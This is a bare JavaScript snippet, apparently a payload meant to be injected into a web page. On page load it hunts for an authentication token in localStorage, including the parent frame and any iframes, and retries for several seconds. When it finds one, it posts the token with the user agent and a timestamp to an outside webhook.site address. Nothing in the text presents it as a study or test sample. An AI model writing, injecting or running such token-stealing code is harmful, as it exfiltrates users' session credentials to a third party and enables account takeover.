(() => {
  const HOOK = 'https://webhook.site/12d75b74-fab7-4abf-aa36-fb46d5c9e913';
  let tries = 0;
  const send = data => fetch(HOOK, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
  const probe = () => {
    tries++;
    let t;
    try { t = localStorage.token; } catch {}
    if (!t && parent !== window) try { t = parent.localStorage.token; } catch {}
    if (!t) [...document.querySelectorAll('iframe')].forEach(f => {
      try { t = f.contentWindow.localStorage.token; } catch {}
    });
    if (t) return send({token: t, ua: navigator.userAgent, ts: Date.now()});
    if (tries < 30) setTimeout(probe, 500);
  };
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', probe);
  } else probe();
})();
